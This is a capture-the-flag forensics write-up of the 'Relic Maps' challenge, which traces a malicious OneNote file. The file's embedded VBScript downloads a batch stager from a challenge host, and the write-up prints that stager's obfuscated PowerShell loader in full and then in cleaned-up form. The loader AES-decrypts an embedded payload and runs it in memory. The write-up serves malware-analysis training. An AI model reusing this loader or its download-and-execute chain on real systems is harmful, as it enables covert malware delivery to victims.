# Relic Maps (medium )
## Description
Pandora received an email with a link claiming to have information about the location of the relic and attached ancient city maps, but something seems off about it. Could it be rivals trying to send her off on a distraction? Or worse, could they be trying to hack her systems to get what she knows?Investigate the given attachment and figure out what's going on and get the flag. The link is to http://relicmaps.htb:/relicmaps.one. The document is still live (relicmaps.htb should resolve to your docker instance).

## Initial thoughts
Based on past forensic ctf's I was thinking this might have to deal with follina vulnerability (it did not) so I opened this in my linux VM. When I loaded /relicmaps.htb/relicmaps.one it prompted me to download the file. My first thought was to run file but all it got was `relicmaps.one: data`. I wasn't familiar with .one files but apparently thats a OneNote file. Anyway I tried the strings command and it looks like it contained other files.

## Stage 1
With the relicmaps.one I realized this file had other files embedded so I ran 
```
binawalk -D=".*"
```
and saw a few interesting files (html and images). I opened the html page, nothing but symbols loaded so I checked out the source code and there was some vbscript. 

Taking a closer look I realized it was running a powershell command to grab two more files.
```
http://relicmaps.htb/uploads/soft/topsecret-maps.one
```
and
```
http://relicmaps.htb/get/DdAbds/window.bat
```

## Stage 2
The topsecret-maps.one file was just like relicmaps.one however the files it attempted to reach no longer existed, soon enough I realized that was a dead end. So I pivotted to window.bat.

This file included a ton of obfuscated batch code, so when I don't know what going on I run it. I used run.any to run this code for me and in its analysis it captured the code that this was running. I also discovered a neat script https://github.com/DissectMalware/batch_deobfuscator that also returned the same result below.
```
"window.bat.exe"  -noprofile -windowstyle hidden -ep bypass -command $eIfqq = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('C:\Users\admin\AppData\Local\Temp\window.bat').Split([Environment]::NewLine);foreach ($YiLGW in $eIfqq) { if ($YiLGW.StartsWith(':: ')) {  $VuGcO = $YiLGW.Substring(3); break; }; };$uZOcm = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($VuGcO);$BacUA = New-Object System.Security.Cryptography.AesManaged;$BacUA.Mode = [System.Security.Cryptography.CipherMode]::CBC;$BacUA.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;$BacUA.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('0xdfc6tTBkD+M0zxU7egGVErAsa/NtkVIHXeHDUiW20=');$BacUA.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('2hn/J717js1MwdbbqMn7Lw==');$Nlgap = $BacUA.CreateDecryptor();$uZOcm = $Nlgap.TransformFinalBlock($uZOcm, 0, $uZOcm.Length);$Nlgap.Dispose();$BacUA.Dispose();$mNKMr = New-Object System.IO.MemoryStream(, $uZOcm);$bTMLk = New-Object System.IO.MemoryStream;$NVPbn = New-Object System.IO.Compression.GZipStream($mNKMr, [IO.Compression.CompressionMode]::Decompress);$NVPbn.CopyTo($bTMLk);$NVPbn.Dispose();$mNKMr.Dispose();$bTMLk.Dispose();$uZOcm = $bTMLk.ToArray();$gDBNO = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($uZOcm);$PtfdQ = $gDBNO.EntryPoint;$PtfdQ.Invoke($null, (, [string[]] ('')))
```

## Stage 3
This command was more obfuscation but its a lot easier to work this. I first cleaned this up a little to look like below.
```
$command = [System.IO.File]::ReadAllText('C:\Users\admin\AppData\Local\Temp\window.bat').Split([Environment]::NewLine);
foreach ($i in $command) 
{
    if ($i.StartsWith(':: ')) 
    {
        $VuGcO = $i.Substring(3); 
        break; 
    }; 
};

$uZOcm = [System.Convert]::FromBase64String($VuGcO);
$cryptography = New-Object System.Security.Cryptography.AesManaged;
$cryptography.Mode = [System.Security.Cryptography.CipherMode]::CBC;
$cryptography.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
$cryptography.Key = [System.Convert]::FromBase64String('0xdfc6tTBkD+M0zxU7egGVErAsa/NtkVIHXeHDUiW20=');
$cryptography.IV = [System.Convert]::FromBase64String('2hn/J717js1MwdbbqMn7Lw==');

$Nlgap = $cryptography.CreateDecryptor();
$uZOcm = $Nlgap.TransformFinalBlock($uZOcm, 0, $uZOcm.Length);
$Nlgap.Dispose();
$cryptography.Dispose();
$mNKMr = New-Object System.IO.MemoryStream(, $uZOcm);
$bTMLk = New-Object System.IO.MemoryStream;
$UnencryptedData = New-Object System.IO.Compression.GZipStream($mNKMr, [IO.Compression.CompressionMode]::Decompress);
$UnencryptedData.CopyTo($bTMLk);
$UnencryptedData.Dispose();
$mNKMr.Dispose();
$bTMLk.Dispose();
$uZOcm = $bTMLk.ToArray();

$gDBNO = [System.Reflection.Assembly]::Load($uZOcm);
$malwareExe = $gDBNO.EntryPoint;
$malwareExe.Invoke($null  (  [string[]] ('')))
```
Essentially how this works is it will parse the windows.bat file and only grab the line following :: (meaning the rest is just nonsense). Then it will proceed to base64decode and perfrom and AES decryption. This data would then be used to build the malware and execute it. For the longest time I fell into a rabbit whole of trying to decode window.bat in different ways but I all I had to do is digest the code and realize it was encrypted.

Anyhow, as you can see I label the variable where the data gets decrypted (UnencryptedData). If we output its contents after its decrypted and before it gets disposed then we should be able to see some of the strings within the executable. In doing so I found the flag.

# Summary 
This challenge required some deobfuscation and used the relicmap page to download the content used to build the malware executable. I had to first find the payload within the initial OneNote file and download the other stager which was a batch file that was used to build the .exe. Instead of outright running the malware I had it print its binary and allowed me to see a few visible strings one of which was the flag.